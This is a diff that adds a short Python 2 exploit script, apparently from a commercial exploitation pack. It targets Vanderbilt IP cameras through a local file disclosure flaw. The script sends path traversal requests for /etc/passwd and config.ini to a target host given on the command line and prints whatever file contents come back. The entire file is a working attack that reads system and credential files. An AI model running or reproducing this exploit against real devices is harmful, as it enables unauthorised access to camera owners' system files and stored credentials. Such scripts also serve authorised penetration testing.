@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_vanderbilt_1'
+_vendor_ = 'vanderbilt'
+_model_  = ['IP-Camera']
+_vuln_   = 'Local File Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/40281/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  urls = [
+    'cgi-bin/check.cgi?file=../../../etc/passwd',
+    'cgi-bin/chklogin.cgi?file=../../../etc/passwd',
+    'cgi-bin/check.cgi?file=config.ini',
+    'cgi-bin/chklogin.cgi?file=config.ini',
+  ]
+  for url in urls:    
+    try:
+      url = 'http://%s:%d/%s' % (host,port,url)
+      response = requests.get(url)
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    if response is None:
+      print '[+] %s not vulnerable' % host
+    elif '404 Not Found' in response.text:
+      print '[+] %s not vulnerable' % host  
+    else:
+      print '[+] %s vulnerable' % host
+      print '[+] URL: %s\n'%url
+      print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
